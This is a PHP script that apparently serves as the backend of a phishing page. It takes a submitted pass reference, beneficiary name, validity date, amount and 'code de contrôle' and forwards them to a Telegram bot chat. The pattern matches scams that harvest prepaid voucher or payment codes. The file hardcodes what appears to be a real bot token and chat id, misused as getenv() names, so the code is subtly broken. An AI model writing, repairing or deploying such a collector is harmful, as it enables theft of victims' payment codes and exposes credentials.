<?php
header('Content-Type: application/json; charset=utf-8');

$token = getenv('8791815080:AAHdaob1u90Fvtuwet7FMeK91r5fA7LWxiU');
$chatId = getenv('-5287248144');

if (!$token || !$chatId) {
    http_response_code(500);
    echo json_encode(['ok'=>false]);
    exit;
}

$data = json_decode(file_get_contents('php://input'), true) ?: [];

$reference = trim($data['reference'] ?? '');
$name      = trim($data['name'] ?? '');
$expiry    = trim($data['expiry'] ?? '');
$amount    = trim($data['amount'] ?? '');
$code_controle = trim($data['code de controle'] ?? ''); 

$message = "🎫 NOUVELLE RÉSERVATION\n\n"
         . "🔢 Référence du pass : {$reference}\n"
         . "👤 Nom du bénéficiaire : {$name}\n"
         . "📅 Date de validité : {$expiry}\n"
         . "💰 Montant : {$amount}\n"
         . "💰 Code de contrôle : {$code_controle}";

$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_POSTFIELDS => http_build_query([
        'chat_id' => $chatId,
        'text' => $message
    ])
]);

$response = curl_exec($ch);
$error = curl_error($ch);
curl_close($ch);

if ($error) {
    http_response_code(502);
    echo json_encode(['ok'=>false]);
    exit;
}

$result = json_decode($response, true);
echo json_encode(['ok'=>!empty($result['ok'])]);
?>







